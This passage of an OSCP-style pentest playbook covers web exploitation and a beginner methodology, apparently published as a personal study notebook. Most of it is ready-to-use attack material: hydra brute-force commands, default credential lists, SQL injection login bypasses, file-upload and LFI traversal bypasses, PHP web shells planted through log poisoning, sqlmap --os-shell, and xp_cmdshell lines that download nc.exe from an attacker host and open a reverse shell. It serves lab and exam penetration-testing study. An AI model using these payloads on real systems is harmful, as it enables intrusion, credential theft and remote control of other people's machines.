        
        ```bash
        davtest --url http://$ip
        davtest -move -sendbd auto -url http://$ip:8080/webdav/
        cadaver http://$ip:8080/webdav/
        ```
        
        Nikto scans:
        
        ```bash
        nikto -host $ip | tee nikto.log
        ```
        
        WordPress:
        
        ```powershell
        wpscan --url http://$ip/ --enumerate ap,at,cb,dbe
        wpscan --rua -e ap --url http://10.11.1.251/wp --passwords /usr/share/seclists/Passwords/probable-v2-top1575.txt
        ```
        
    - **Login portals**
        
        Brute force login portals:
        
        ```bash
        #basic auth
        hydra -l user -P /usr/share/wordlists/rockyou.txt -f $ip http-get /path
        #login form
        hydra -L users.txt -P users.txt $ip http-post-form "<directory>:login_username=^USER^&secretkey=^PASS^&<rest of post request>:<error message>"
        #create custom password list
        cewl -w cewl_passlist.txt -d 5 $RHOST/index.pl
        ```
        
        Standard credentials you should try when being blocked by login portal:
        
        ```bash
        admin:admin
        admin:password
        admin:administrator
        admin:(name of box)
        user:user
        user:password
        user:12345
        guest:guest
        root:root
        (name of box):(name of box)
        (default account):(name of application)
        
        admin:<blank>
        admin:<servicename>
        <servicename>:<servicename>
        root:admin
        root:password
        root:<servicename>
        <username>:password
        <username>:admin
        <username>:username
        username:<servicename>
        ```
        
        Try SQL injections to bypass the login form:
        
        ```
        ' or 1=1;--
        ' or '1'='1
        ' or 1=1;#
        ') or ('x'='x
        ' or <column> like '%';--
        ' or 1=1 LIMIT 1;--
        admin' --
        admin' #
        admin'/*
        ' or 1=1--
        ' or 1=1#
        ' or 1=1/*
        ') or '1'='1--
        ') or ('1'='1—
        ' or 1/*
         */ =1 --
        admin' or 'a'='a
        '#
        ```
        
    - **File upload**
        
        ```bash
        #if NMAP show something like: Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND
        #we want to check if we can upload files
        davtest -url http://IP
        #if we see succedd we can use curl to upload:
        curl -X PUT http://10.10.10.15/df.txt -d @test.txt
        #and execute it:
        **curl http://10.10.10.15/df.txt**
        
        Blacklisting bypass
                bypassed by uploading an unpopular php extensions. such as: pht, phpt, phtml, php3, php4, php5, php6 
            Whitelisting bypass
                passed by uploading a file with some type of tricks, Like adding a null byte injection like ( shell.php%00.gif ). Or by using double extensions for the uploaded file like ( shell.jpg.php)
        ```
        
        Try alternative extensions for file uploads:
        
        ```
        Php > upload as pHp / phP / test.php.jpg /
        php - phtml, .php, .php3, .php4, .php5, and .inc
        asp - asp, .aspx
        perl - .pl, .pm, .cgi, .lib
        jsp - .jsp, .jspx, .jsw, .jsv, and .jspf
        Coldfusion - .cfm, .cfml, .cfc, .dbm
        ```
        
    - **If a File is Found**
        - `steghide` - check pictures for hidden files
            
            ```bash
                apt-get install steghide
            
                steghide extract -sf picture.jpg
            
                steghide info picture.jpg
            
                apt-get install stegosuite
            ```
            
        - [Stegseek](https://github.com/RickdeJager/stegseek) - lightning fast steghide cracker to extract hidden data from files
            
            ```bash
            stegseek [stegofile.jpg] [wordlist.txt]
            ```
            
        - `binwalk` - extract hidden files from files (steganography)
            
            ```bash
            binwalk FILE.JPG
            #if something was found 
            binwalk -e FILE
            ```
            
        - strings - check strings in files
            
            ```bash
            strings FILE.jpg
            ```
            
        - [exiftool](https://github.com/exiftool/exiftool) - pictures metadata
        - zip2john - prepare an encrpyted zip file for john hacking
            
            ```bash
            zip2john ZIPFILE > zip.hashs
            ```
            
        - SQLite DB
            
            ```bash
            #if we found a flat-file db 
            file EXAMPLE.db
            #if sqlite3
            sqlite3 <database-name>
            .tables
            PRAGMA table_info(customers);
            SELECT * FROM customers;
            ```
            
        - sqlmap - check website for sql injection (more info down)
            
            [Sqlmap trick](https://hackertarget.com/sqlmap-post-request-injection/) - if we have a login page, we can try admin:admin, catch that in burpsuite, save the full request to a file, run:
            
            ```bash
            sqlmap -r FILENAME --level=5 --risk=3 --batch
            sqlmap -r FILENAME -dbs --level=5 --risk=3 --batch
            
            sqlmap -r FILENAME --dbs #enumarate DB's
            sqlmap -r FILENAME -D DB_Name --tables #enumarate tables
            sqlmap -r FILENAME -D DB_Name -T TABLE_Name --dump #DUMP table
            
            #Find SQL in webpage url automatically
            sqlmap -u https://IP/ –crawl=1
            
            #with authentication
            sqlmap -u “http://target_server” -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password
            
            #Get A Reverse Shell (MySQL)
            sqlmap -r post_request.txt --dbms "mysql" --os-shell
            ```
            
        - [fimap](https://github.com/kurobeats/fimap) - Check for LFI, find, prepare, audit, exploit and even google automatically for local and remote file inclusion
            
            ```bash
            ~/tools/fimap/src/fimap.py –H –u http://target-site.com/ -w output.txt
            ```
            
            If we see in burpsuite php$url= we need to test for LFI (try /etc/passwrd)
            
            ```bash
            http://$ip/index.php?page=/etc/passwd
            http://$ip/index.php?file=../../../../etc/passwd
            ```
            
    - **File traversal list - LFI/RFI**
        
        [Path Traversal Cheat Sheet: Windows | GracefulSecuritygracefulsecurity.com](https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
        
        - Linux Path`../../../../../../../../etc/passwd`
        - [Windows LFI](https://github.com/seal9055/Docs/blob/main/windows_lfi)`c:\windows\system32\drivers\etc\hosts`
        - RFI`http://<LHOST:80>/p0wny_shell.php`
        - Wordlists
            
            ```
            /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
            /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
            ```
            
            Encoded Traversal Strings:
            
            ```bash
            ../
            ..\
            ..\/
            %2e%2e%2f
            %252e%252e%252f
            %c0%ae%c0%ae%c0%af
            %uff0e%uff0e%u2215
            %uff0e%uff0e%u2216
            ..././
            ...\.\
            ```
            
            LFI checkers:
            
            ```bash
            fimap -u "http://INSERTIPADDRESS/example.php?test="
            
            dotdotpwn.pl -m http -h 192.168.1.1 -M GET
            
            Ordered output
            
            curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
            /root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=
            ```
            
            Bypass execution with base64 filter
            
            ```bash
            http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=index
            
            base64 -d savefile.php
            ```
            
            Bypass extension with nullbyte and/or as parameter
            
            ```bash
            http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt%00
            http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt?
            ```
            
            Code execution via /proc/self/environ and user agent
            
            ```bash
            Edit user agent in browser with payload and execute LFI
            
            USERAGENT: <?system('wget http://IPADDRESS/shell.php -O shell.php');?>
            LFI: www.website.com/view.php?page=../../../../../proc/self/environ
            ```
            
            Web log poison
            
            ```bash
            nc 10.10.10.10 80
            GET /<?php echo shell_exec($_GET['cmd']); ?> HTTP/1.1
            Host: 10.10.10.10
            Connection: close
            
            LFI: www.website.com/view.php?page=../../../../../var/log/apache2/access.log&cmd=id
            ```
            
            SSH auth.log poison
            
            ```bash
            ssh "<?php phpinfo();?>"@IPADDRESS
            
            LFI: www.website.com/view.php?page=../../../../../var/log/auth.log
            
            ```
            
            PHP session file attack
            
            ```bash
            Use proxy to get PHP session id and try to poison variables submitted with payloads
            
            LFI: www.website.com/view.php?page=../../../../../var/lib/php/sess_as7sdfasd87392s
            ```
            
    - **SQLI**
        
        SQLMap
        
        ```sql
        sqlmap -r <burp_file>
        ```
        
        Test for SQLI
        
        ```sql
        '
        '-- -
        ASCII(97)
        ' or 1=1--
        '; waitfor delay ('0:0:20)'--
        wfuzz -u http://<RHOST>/FUZZ -w /usr/share/seclists/Fuzzing/special-chars.txt
        ```
        
        Abuse Command Shell
        
        ```sql
        ' EXEC sp_configure 'xp_cmdshell', 1--
        ' reconfigure--
        ' EXEC xp_cmdshell 'certutil -urlcache -f http://<LHOST>:<LPORT>/nc.exe nc.exe'--
        ' EXEC xp_cmdshell "nc.exe -e cmd.exe <LHOST> <LPORT>";--
        ```
        
    - **RCE through SQLi**
        
        ```sql
        #Through file creation
        union all select "<?php echo shell_exec($_GET['cmd']);?>",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'
        #if running as database admin, use xp_cmdshell
        http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'
        '; exec master.dbo.xp_cmdshell 'command'
        
        #On MSSQL 2005 you may need to reactivate xp_cmdshell first as it's disabled by default:
        EXEC sp_configure 'show advanced options', 1;--
        RECONFIGURE;--
        EXEC sp_configure 'xp_cmdshell', 1;--
        RECONFIGURE;--
        
        #On MSSQL 2000:
        EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
        ```
        
    - **CGI-BIN**
        - Popular Extensions: `.sh` & `.pl`
        - Nmap Check`nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/<vulnerable file>,cmd=ls <RHOST>`
        - MSF Check`auxiliary/scanner/http/apache_mod_cgi_bash_env`
        - MSF Exploit`exploit/multi/http/apache_mod_cgi_bash_env_exec`
    
    <aside>
    🔑 If you use exploits for web apps but they don't work as expected: proxy network traffic through burp and see the sent requests
    
    </aside>
    
    checklist from HackTricks (not exactly OSCP-focused, but still useful):
    
    > In this methodology we are going to suppose that you are going to a attack a domain (or subdomain) and only that. So, you should apply this methodology to each discovered domain, subdomain or IP with undetermined web server inside the scope.
    > 
    - [ ]  Start by identifying the technologies used by web server.
        - [ ]  Any **known vulnerability** of the version of the technology?
        - [ ]  Using any **well known tech**? Any **useful trick** to extract more information?
        - [ ]  Any **specialised scanner** to run (like wpscan)?
        - [ ]  Any **vulnerable cookie**? **JWT**?
    - [ ]  Check for **vulnerable proxies** being used (*Test this in every new tech discovered in the webapp*) :
        - [ ]  **hop-by-hop headers**
        - [ ]  **Request Smuggling**
        - [ ]  **Cache Poisoning/Cache Deception**
    - [ ]  Launch **general purposes scanners**. You never know if they are going to find something or if the are going to find some interesting information.
    - [ ]  Start with the **initial checks**: **robots**, **sitemap**, **404** error and **SSL/TLS scan** (if HTTPS).
    - [ ]  Start **spidering** the web page: It's time to **find** all the possible **files, folders** and **parameters being used.** Also, check for **special findings**.
        - [ ]  *Note that anytime a new directory is discovered during brute-forcing or spidering, it should be spidered.*
    - [ ]  **Directory Brute-Forcing**: Try to brute force all the discovered folders searching for new **files** and **directories**.
        - [ ]  *Note that anytime a new directory is discovered during brute-forcing or spidering, it should be Brute-Forced.*
    - [ ]  **Backups checking**: Test if you can find **backups** of **discovered files** appending common backup extensions.
    - [ ]  **Brute-Force parameters**: Try to **find hidden parameters**.
    - [ ]  Once you have **identified** all the possible **endpoints** accepting **user input**, check for all kind of **vulnerabilities** related to it.
        - [ ]  This is by far the **most complex part of pentesting web**, and **depending** of the **vulnerability** the pentester should know how to **discover** it. In **this book** you can find **explained** a lot of **web vulnerabilities** related to user input.

# Post-Exploitation

<aside>
📌

No Active Directory content here, I passed before it was part of the exam. Might add an AD section later based on my current teaching workflow.

</aside>

### 🧭 For Beginners: High-Level Methodology Overview (Entry-Level Pentest/CTF Style)

This is a high-level overview of the methodology used for CTFs and entry-level pentesting. Each phase (Reconnaissance, Enumeration, Exploitation, Privilege Escalation, Post Exploitation) should have a dedicated page (or pages) in your notebook, with all relevant commands, links, and additional information noted down.

1. Open Notion template to take screenshots and paste outputs.
2. Run scans: fast `rustscan` or the slower `nmap`. Optional: `autorecon`. 
    
    ```python
    sudo rustscan -a 10.10.xx.xx -- -A -sC
    sudo nmap -sV -Pn 10.10.xx.xx
    sudo nmap -sV -Pn -sC -p- 10.10.xx.xx
    ```
    
3. Check first results (web, SSH, FTP) from the first nmap scan.
4. Review slower nmap scan results.
5. Start enumeration with the easiest port (SMB, FTP, HTTP...), then proceed to the next one.
6. Depending on each port, do the appropriate enumeration techniques.
7. Time to find exploits and try them.
    1. In case webpage is your target, see 'Web Exploitation' above.
8. When you get the exploit and you have tweaked it for your target and purpose you should be inside as low user. See the “Post Exploitation” sections above, depending on the target’s OS. 
9. Start with simple enumeration such as OS version, users, permissions, files in home directories, and available tools.
10. Find out how to upload files.
11. Upload your privilege escalation scripts.
    1. Check services running and check the unusual ones in [gtfobins](https://gtfobins.github.io/) or [lolbas](https://lolbas-project.github.io/#) and [exploit-db](https://www.exploit-db.com/)
12. Run your exploit and get root, collect proof files, passwords, review the system for interesting files for other machines (if applicable).

---

---

Originally published here. For updates visit [olgahacks.com/playbook](https://olgahacks.com/playbook).